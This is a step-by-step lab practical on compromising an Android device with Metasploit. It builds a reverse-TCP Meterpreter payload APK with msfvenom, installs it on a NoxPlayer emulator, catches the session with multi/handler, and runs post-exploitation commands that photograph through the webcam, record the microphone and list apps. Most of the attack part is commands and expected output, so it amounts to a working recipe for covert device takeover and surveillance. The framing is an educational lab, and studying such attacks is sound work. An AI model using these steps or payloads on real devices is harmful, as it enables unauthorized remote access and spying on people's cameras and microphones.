
---
# Practical: Android Exploitation Using Metasploit Framework


> **Lab Environment:** Kali Linux (Attacker) + Windows with NoxPlayer Android Emulator (Target)  
> **Tools Used:** Metasploit Framework, msfvenom, PostgreSQL, NoxPlayer  
> **Protocol:** TCP Reverse Shell over LAN

---

## Objectives

- Install and configure the Metasploit Framework with a PostgreSQL database
- Generate a malicious Android APK using `msfvenom`
- Set up a listener using `exploit/multi/handler`
- Establish a Meterpreter session with an Android target
- Execute post-exploitation commands on the compromised device

---

## Prerequisites

- Kali Linux machine (physical or VM) with internet access
- Windows machine on the same network running NoxPlayer
- Both machines on the same LAN (note your Kali IP using `ip a`)
- Basic familiarity with Linux terminal

---

## Step 1 — Install Metasploit Framework

```bash
apt install metasploit-framework -y
```

> This installs the full Metasploit Framework including `msfconsole` and `msfvenom`.

---

## Step 2 — Install PostgreSQL

```bash
apt install postgresql
```

> Metasploit uses PostgreSQL as its backend database for storing workspace data, scan results, and session logs.

---

## Step 3 — Initialize the Metasploit Database

```bash
msfdb init
```

**Expected Output:**
```
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

---

## Step 4 — Launch Metasploit Console

```bash
msfconsole
```

Once inside, verify the database connection:

```
msf6 > db_status
```

**Expected Output:**
```
[*] Connected to msf. Connection type: postgresql.
```

> If the database is not connected, run `msfdb start` before launching `msfconsole`.

---

## Step 5 — Generate the Malicious APK

Open a **new terminal** (keep `msfconsole` open) and run:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=4444 -o app.apk
```

**Replace `<kali ip>`** with your actual Kali machine IP (find it with `ip a`).

| Parameter | Description |
|-----------|-------------|
| `-p android/meterpreter/reverse_tcp` | Payload — Android reverse TCP Meterpreter |
| `LHOST` | Your Kali IP (the listener address) |
| `LPORT` | Port to listen on (4444) |
| `-o app.apk` | Output file name |

**Expected Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: XXXX bytes
Saved as: app.apk
```

---

## Step 6 — Transfer APK to Windows

Transfer the generated `app.apk` from Kali to a folder on your Windows.

---

## Step 7 — Set Up NoxPlayer on Windows

1. Download and install **NoxPlayer** from [bignox.com](https://www.bignox.com)
2. Launch NoxPlayer and complete the initial Android setup
3. Set up a basic Android environment (Google account optional for this lab)

---

## Step 8 — Install APK on the Android Emulator

1. Locate the `app.apk` file on your Windows machine
2. **Drag and drop** `app.apk` into the NoxPlayer window  
   *(NoxPlayer will automatically prompt to install the APK)*
3. Accept any installation prompts and allow installation from unknown sources if asked

---

## Step 9 — Configure the Listener in Metasploit

Go back to your **msfconsole** terminal and enter the following commands one by one:

```
msf6 > use exploit/multi/handler
```

```
msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set LHOST <Kali ip>
```

```
msf6 exploit(multi/handler) > set LPORT 4444
```

```
msf6 exploit(multi/handler) > run
```

**Expected Output:**
```
[*] Started reverse TCP handler on <Kali ip>:4444
```

> Metasploit is now actively listening for an incoming connection from the APK.

---

## Step 10 — Execute the APK on Android

1. In NoxPlayer, navigate to where the APK was installed (check the app drawer)
2. **Double-click / tap the app** to launch it
3. Switch back to the Metasploit console

**Expected Output (Meterpreter session opened):**
```
[*] Sending stage (XXXXX bytes) to <target-ip>
[*] Meterpreter session 1 opened (<kali-ip>:4444 -> <target-ip>:<port>)

meterpreter >
```

> A Meterpreter session is now active — you have a remote shell on the Android device.

---

## Step 11 — Post-Exploitation Commands

Run the following commands in the `meterpreter >` prompt:

### System Information
```
meterpreter > sysinfo
```
Displays OS version, device name, architecture, and Meterpreter version.

---

### Current Working Directory
```
meterpreter > pwd
```
Shows the current directory path on the Android filesystem.

---

### Capture Webcam Snapshot
```
meterpreter > webcam_snap
```
Takes a photo from the device's front/rear camera and saves it to your Kali machine.

---

### Record Microphone
```
meterpreter > record_mic
```
Records audio from the device microphone. You will be prompted to specify duration.

---

### List Installed Applications
```
meterpreter > app_list
```
Displays all installed applications on the Android device.

---
## Key Concepts

- **Reverse TCP Shell:** The target device initiates a connection *back* to the attacker, bypassing most firewalls.
- **Meterpreter:** An advanced in-memory payload that provides an interactive shell with built-in post-exploitation modules.
- **msfvenom:** A standalone payload generator and encoder — replacement for `msfpayload` + `msfencode`.
- **multi/handler:** A generic exploit handler used to receive connections from any compatible payload.

---
